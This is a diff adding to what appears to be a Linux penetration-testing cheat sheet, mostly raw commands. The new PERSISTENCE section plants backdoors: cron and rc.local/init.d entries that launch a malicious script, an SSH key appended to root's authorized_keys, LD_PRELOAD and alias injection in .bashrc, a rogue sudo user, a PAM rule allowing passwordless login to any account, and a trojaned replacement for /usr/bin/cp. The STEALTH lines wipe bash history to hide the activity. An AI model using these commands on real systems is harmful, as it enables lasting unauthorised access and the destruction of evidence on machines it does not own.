@@ -98,8 +98,49 @@ curl (HTTP upload/download)
 netcat
 telnet
 
+##################
+PERSISTENCE
+##################
+#Cronjobs
+crontab -e
+*/5 * * * * /path/to/malicious_script.sh
+echo "*/5 * * * * root /path/to/malicious_script.sh" >> /etc/crontab (root)
+
+#init.d scripts & /etc/rc.local
+echo "/path/to/malicious_script.sh &" >> /etc/rc.local
+chmod +x /etc/rc.local
+
+cp malicious_service.sh /etc/init.d/
+chmod +x /etc/init.d/malicious_service.sh
+update-rc.d malicious_service.sh defaults
+
+#ssh_key 
+echo "your_public_ssh_key" >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
+
+#LD_PRELOAD
+*create .so file*
+echo 'export LD_PRELOAD=/path/to/malicious_lib.so' >> ~/.bashrc
+
+#Users/PAM
+useradd -m -s /bin/bash -G sudo rogueuser
+echo -e "password\npassword" | passwd rogueuser
+*modify /etc/pam.d.common-auth*
+auth sufficient pam_unix.so nullok (Log into any account without a password)
+
+#Alias Injection
+echo "alias ls='ls; /path/to/malicious_script.sh'" >> ~/.bashrc
+
+#modify system binaries
+mv /usr/bin/cp /usr/bin/cp_bak
+echo -e "#!/bin/bash\n/path/to/malicious_script.sh\n/usr/bin/cp_bak \"\$@\"" > /usr/bin/cp
+chmod +x /usr/bin/cp
+
 #########
 STEALTH
 ##########
 #clear logs
 echo "" > ~/.bash_history
+history -c && history -w
+> ~/.bash_history && history -c
